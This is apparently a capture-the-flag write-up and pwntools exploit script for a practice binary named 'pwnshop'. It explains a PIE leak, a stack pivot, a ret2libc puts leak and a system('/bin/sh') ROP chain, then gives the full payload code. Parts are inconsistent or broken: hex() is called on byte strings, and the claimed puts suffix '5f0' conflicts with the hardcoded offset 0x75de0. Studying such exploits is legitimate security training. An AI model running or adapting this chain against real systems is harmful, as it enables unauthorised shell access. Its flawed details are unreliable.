# Type: ret2libc, buffer overflow, stack pivot, ROP

'''
Explanation: 
After we send our padding bytes, beacause it uses reads which is not null-terminated, when we use printf, it will keep on reading. And as we can see, in our stack after the buffer variable, we have a pointer variable. And that pointer variable has a memory address there. This memory address is the actual address of a location in the program of offset 0x1040c0. And this actual memory address is leaked when printf returns our value, which is b'1' * b. Then we take that address and subtract 0x40c0 from it, and we get the actual memory address of where the program actually starts, which is the actual address of 0x100000.
We have to use stack pivot technique because we can only input 80bytes in the buffer and not more, because its using puts function and not fgets like others. 
We have to add our binary_offset (original start address of our binary file) when we are passing any address in the binary due to PIE (i.e sub_rsp_address).
Due to the usage of reads it will only read 8 more bytes after our initial 72byte payload, so we better put something smart there. We search for any instruction that will manipulate the value of RSP (i.e POP RSP; RET, so we search by ROPgadget and we find 'SUB RSP, 0x28; RET', and get it address: 0x1219 (then of course add offset to it to get the actual mem address of that instruction). This instruction will send the RSP upwards above our buffer, and we control that buffer, meaning we can put addresses in that buffer and RSP wll point to them. So when 'SUB RSP, 0x28; RET' executes, becuase of the RET it will take thoses addresses one by one and execute the instructions on thoese addresses, thus creating our ROP chain. A ROP gadget obviously ends with a RET instruction.
Now we need to find the actual memory address of LIBC (using a technique called RET2LIBC). In our program we have a puts call. We get the address of puts from .got.plt section of our program. Then on the right side of XREF we can get the address of where it was referenced. Now we have two addresses.
We are using puts, to put(print on screen) the actual address of itself in the memory. And we save our leaked PUTS address.
Now lets find out where is the PUTS address normally, when the beginning is 0x000000000000. To do that we run the command 'ldd pwnshop'. Then copy the libc.so file and search for 'puts' offset by 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts', which turns out to be 0x0000000000075de0. We also get the offset of 'system' by command 'readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system' and the address is 0x0000000000049850. 
Now we'll also look for the string '/bin/sh' to use it as an argument for system() call. We use command 'strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh''. Which is 0x188962.
Then we calculate the actual addresses of system and /bin/sh in libc. We also look for ROP gadget pop rdi; ret.
Finally we exploit it. We create ROP chain, with POP RDI RET. So it will take our /bin/sh string and put it in RDI. And system will use this value as its argument, thus giving us a shell.

But right now, it will only work on our machine with the specific libc that we have. What if we want it to be able to run on any machine? We can use the leaked memory address of puts@GLIBC_x.x.x here. We can use the last 3 digits as put clues.

Note: The addresses of the actual memory locations will be different dues to ASLR. But the randomization will occur only on the first addresses. And the last addresses(3) will always be the same for that specific libc version. So in our case, the random memory address that we get its last 3 numbers are always the same (e.g. 5f0). 
And if we search on this website 'https://libc.blukat.me/', it give it 'puts' and the last 3 digits of address '5f0'. We get the possible libc's where puts is at ....5f0.
The results are as follows:

libc6-amd64_2.31-13_i386
libc6-amd64_2.31-17_i386
libc6-amd64_2.31-9_i386
libc6_2.31-13_amd64
libc6_2.31-17_amd64
libc6_2.31-9_amd64

And if we click on them it'll give us the offsets of symbols like 'system', 'reads', 'puts', etc. And we can take these offsets and try them in our program.
'''
from pwn import *

def main():
	io = process('./pwnshop')
	
	io.sendlineafter('\n> ', '2')
	io.sendlineafter('What do you wish to sell? ', '')
	leak_padding = b'1' * 8
	io.sendlineafter('How much do you want for it? ', leak_padding)
	
	
	# Leaking address of binary (Breaking PIE)
	binary_offset = io.recvline().split(leak_padding)[1].split(b'?')[0]
	binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
	binary_offset = u64(binary_offset, endian='little')
	binary_offset -= 0x40c0
	print("Leaked Offset: ", str(hex(binary_offset)))
	
	# Leaking address of LIBC (Breaking ASLR)
	got_puts = p64(binary_offset + 0x4018)
	plt_puts = p64(binary_offset + 0x1030)
	pop_rdi = p64(binary_offset + 0x13c3)
	buy_function = p64(binary_offset + 0x132a)
	
	# finding offsets in LIBC 
	libc_puts = 0x75de0
	libc_system = 0x49850
	libc_bin_sh = 0x188962

	# Stack Pivot
	sub_rsp_address = p64(0x1219 + binary_offset)
	padding_to_rop_chain = b'a' * 40
	
	rop_chain = pop_rdi + got_puts + plt_puts + buy_function
	padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
	
	
	payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp_address 
	
	io.sendlineafter('\n> ', '1')
	io.sendafter('Enter details: ', payload)
	
	leaked_puts_libc = io.recvline()
	leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
	leaked_puts_libc = u64(leaked_puts_libc, endian='little')
	print("Leaked puts@GLIBCL offset: ", leaked_puts_libc)
	
	libc_offset = leaked_puts_libc - libc_puts 
	
	system = p64(libc_offset + libc_system)
	print("Calculated system location: ", str(hex(system)))
	bin_sh = p64(libc_offset + libc_bin_sh)
	print("Calculated /bin/sh location: ", str(hex(bin_sh)))
	
	rop_chain = pop_rdi + bin_sh + system 
	padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
	
	payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp_address
	
	io.sendafter('Enter details: ', payload)
	#io.interactive()
	
if __name__ == '__main__':
	main()
	
